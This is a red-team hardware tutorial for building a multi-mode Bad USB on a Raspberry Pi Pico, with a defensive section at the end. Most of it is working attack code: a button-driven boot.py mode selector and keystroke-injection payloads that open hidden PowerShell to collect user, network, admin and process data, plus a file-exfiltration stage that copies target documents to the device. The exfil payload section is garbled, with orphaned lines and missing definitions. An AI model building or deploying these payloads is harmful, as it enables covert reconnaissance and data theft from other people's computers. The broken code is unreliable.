SG-34 — Red Team Hardware

Bad USB Multi-Payload Tool

Build a Bash Bunny equivalent using a $4 Raspberry Pi Pico. Combines HID keyboard injection, USB mass storage, data exfiltration to onboard flash, and a hardware payload selector via button press count.

Intermediate ~$6 USD 3–4 Hours CircuitPython 9.x
Section 1

▶ How It Works

The SG-33 Rubber Ducky from the previous guide injects keystrokes and nothing else. The Bad USB expands on that with three operating modes selectable via a hardware button before the device is armed. In storage mode the Pico presents as a USB flash drive — useful for staging files or collecting exfiltrated data. In HID mode it injects keystrokes. In dual mode it presents as both simultaneously.

The hardware payload selector uses a tactile button on GP15. The number of button presses within a 3-second boot window determines which payload runs. This mirrors the physical switch design of the Hak5 Bash Bunny, implemented here entirely in CircuitPython using the microcontroller NVM (non-volatile memory) to pass the mode selection from boot.py to code.py.

Mode 1 — 1 press
HID Attack Mode
Pure keystroke injection. Drive hidden from host OS. Fastest mode — no storage overhead. Equivalent to SG-33 behavior.
Mode 2 — 2 presses
Exfil Mode
HID injection plus writable flash storage. Payload runs, then copies files from the target to the Pico's 2MB flash for retrieval.
Mode 3 — 3 presses
Recon Mode
Passive enumeration — collects system info, network config, user list, running processes — and writes to flash without high-risk commands.
Mode 0 — hold on boot
Setup Mode
Drive writable, HID disabled. Update payload files safely without triggering injection. Always use this at your desk.

▶ Wiring Diagram

The payload selector button connects GP15 to 3.3V through a 10k pull-down resistor to GND. When the button is not pressed, GP15 reads LOW (0V). When pressed, it reads HIGH (3.3V). The onboard LED on GP25 provides mode feedback via blink count during the boot window.

Section 4

▶ boot.py — Mode Selection Logic

CircuitPython's boot.py executes before any USB device descriptors are committed to the host. This is the only point at which you can toggle USB storage and HID availability — you cannot change USB device class from code.py at runtime. The mode selection reads button presses during a 3-second window after power-on, then writes the result to NVM byte 0 for code.py to read.

CircuitPython — boot.py 
import board
import digitalio
import storage
import usb_hid
import time
import microcontroller

# Onboard LED for blink feedback during mode selection window
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

# Payload selector button on GP15 with external 10k pull-down
btn = digitalio.DigitalInOut(board.GP15)
btn.direction = digitalio.Direction.INPUT
btn.pull = digitalio.Pull.DOWN

def blink(n, period=0.15):
    for _ in range(n):
        led.value = True;  time.sleep(period)
        led.value = False; time.sleep(period)

# Signal that boot.py is active
blink(2)
time.sleep(0.3)

# 3-second window to count button presses (rising-edge detection)
press_count = 0
last_state  = False
deadline    = time.monotonic() + 3.0

while time.monotonic() < deadline:
    current = btn.value
    if current and not last_state:   # Rising edge detected
        press_count += 1
        blink(1)                         # Confirm press
        time.sleep(0.08)               # Debounce
    last_state = current

# MODE 0: button held at end of window → forced setup mode
if btn.value:
    press_count = 0

# Persist mode to NVM byte 0 for code.py
microcontroller.nvm[0] = press_count

# Configure USB peripherals based on selected mode
if press_count == 0:
    # SETUP MODE — drive writable, no HID injection
    blink(6, period=0.08)   # Rapid 6-blink = setup

elif press_count == 1:
    # MODE 1: HID only — hide CIRCUITPY from host
    storage.disable_usb_drive()
    usb_hid.enable((usb_hid.Device.KEYBOARD,))
    blink(1)

elif press_count == 2:
    # MODE 2: HID + storage (exfil)
    # Remount filesystem writable from Pico's perspective
    storage.remount("/", readonly=False)
    usb_hid.enable((usb_hid.Device.KEYBOARD,))
    blink(2)

elif press_count >= 3:
    # MODE 3: Recon — HID only, drive hidden, payload writes to flash
    storage.disable_usb_drive()
    usb_hid.enable((usb_hid.Device.KEYBOARD,))
    blink(3)

btn.deinit()
led.deinit()
Section 5

▶ Payload Files

Each mode maps to a separate Python module. code.py reads NVM byte 0 (set by boot.py) and imports the appropriate payload. This keeps each payload self-contained and easy to update in setup mode.

CircuitPython — code.py (Dispatcher) 
import microcontroller
import board
import digitalio
import time

led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

mode = microcontroller.nvm[0]

if mode == 0:
    # Setup mode — blink steady to confirm we are alive and ready
    while True:
        led.value = True;  time.sleep(1.0)
        led.value = False; time.sleep(1.0)

elif mode == 1:
    import payload_hid     # Keystroke injection only

elif mode == 2:
    import payload_exfil   # HID + file collection

elif mode >= 3:
    import payload_recon   # Passive enumeration
CircuitPython — payload_hid.py (Mode 1) 
import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd    = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

def key(*k):   kbd.press(*k); kbd.release_all()
def write(s):  layout.write(s)

time.sleep(2.5)  # Wait for host USB enumeration to settle

# Open PowerShell hidden, collect network + user info to temp file
key(Keycode.WINDOWS, Keycode.R)
time.sleep(0.7)
write("powershell -WindowStyle Hidden -NonInteractive")
key(Keycode.ENTER)
time.sleep(1.5)
write("$f=[System.IO.Path]::GetTempFileName();")
key(Keycode.ENTER)
write("ipconfig /all | Out-File $f;")
key(Keycode.ENTER)
write("net user | Out-File $f -Append;")
key(Keycode.ENTER)
write("whoami /all | Out-File $f -Append")
key(Keycode.ENTER)
time.sleep(2.0)
write("exit")
key(Keycode.ENTER)

    os.mkdir("/exfil")

    pass  # Directory already exists

# The PowerShell payload locates the drive by volume label and copies files.

write("if($v){$d=\"$v\\exfil\";New-Item -ItemType Directory $d -EA SilentlyContinue|Out-Null;")

import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd    = Keyboard(usb_hid.devices)

def key(*k):  kbd.press(*k); kbd.release_all()
def write(s): layout.write(s)

time.sleep(2.5)

# Mode 3 hides the drive — output goes to %TEMP% for manual retrieval
# or a follow-on network exfil stage. This payload is deliberately
# low-privilege: no admin commands, no registry writes, no persistence.
key(Keycode.WINDOWS, Keycode.R)
time.sleep(0.7)
write("powershell -WindowStyle Hidden -NonInteractive")
key(Keycode.ENTER)
time.sleep(1.5)

write("$ts=Get-Date -f yyyyMMdd_HHmmss; $r=\"$env:TEMP\\recon_$ts.txt\";")
key(Keycode.ENTER)
write("\"=== SYSTEM ===\"|Out-File $r; systeminfo|Out-File $r -Append;")
key(Keycode.ENTER)
write("\"=== NETWORK ===\"|Out-File $r -Append; ipconfig /all|Out-File $r -Append;")
key(Keycode.ENTER)
write("\"=== USERS ===\"|Out-File $r -Append; net user|Out-File $r -Append;")
key(Keycode.ENTER)
write("\"=== LOCAL ADMINS ===\"|Out-File $r -Append; net localgroup administrators|Out-File $r -Append;")
key(Keycode.ENTER)
write("\"=== PROCESSES ===\"|Out-File $r -Append; Get-Process|Out-File $r -Append;")
key(Keycode.ENTER)
time.sleep(5.0)
write("exit")
key(Keycode.ENTER)

▶ CIRCUITPY Drive Layout

CIRCUITPY/ (Pico flash — 2MB total, ~1.5MB usable after CircuitPython) │ ├── boot.py ← Mode selector, runs before USB enumeration ├── code.py ← Dispatcher, routes to payload via NVM[0] ├── settings.toml ← Optional runtime config (e.g. DELAY_MS=2500) │ ├── payload_hid.py ← Mode 1: keystroke injection only ├── payload_exfil.py ← Mode 2: HID + file collection ├── payload_recon.py ← Mode 3: passive system enumeration │ ├── lib/ │ └── adafruit_hid/ │ ├── __init__.mpy │ ├── keyboard.mpy │ ├── keyboard_layout_us.mpy │ └── keycode.mpy │ └── exfil/ ← Created at runtime in Mode 2 └── (files copied from target Documents folder)
Retrieving Exfiltrated Data

After a Mode 2 run: remove device, then reconnect in Mode 0 (hold button during boot). CIRCUITPY mounts writable and you can read the /exfil/ directory. Before the next deployment, clear NVM: open a CircuitPython serial REPL and run import microcontroller; microcontroller.nvm[0] = 0.

Section 8

▶ How to Defend Against This — Blue Team Perspective

USB Port Blocking at Endpoint Management Level

Microsoft Intune Device Configuration profiles, Jamf Pro restrictions, and Group Policy Device Installation restrictions can block USB storage class devices (GUID {4D36E967-E325-11CE-BFC1-08002BE10318}) and HID devices (GUID {745A17A0-74D3-11D0-B6FE-00A0C90F57DA}) by class. Whitelist only specifically approved VID/PID pairs for keyboards and mice your organization has deployed.

Windows Defender Device Control — Removable Storage Policies

Defender for Endpoint Device Control policies can restrict all removable storage in read-only or block mode by default, with allowlist exceptions for approved devices by serial number. This prevents the Mode 2 exfil stage — the Pico can inject keystrokes but cannot receive files from the host.

PowerShell Script Block Logging and AMSI

Enable PowerShell Script Block Logging (Event ID 4104) via Group Policy at Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell > Turn on PowerShell Script Block Logging. Every PowerShell command typed or injected is recorded in the Security event log. The Antimalware Scan Interface (AMSI) additionally passes all script content to registered AV engines in real time.

USB Descriptor Anomaly Detection

The mode-switching behavior of this device (same physical device presenting different USB descriptors on different connections) is a detectable anomaly. Windows Event ID 6416 logs every new device recognition event. A SIEM rule that alerts when a device with the same VID/PID previously seen as a keyboard now enumerates as a storage device (or vice versa) catches this class of attack.
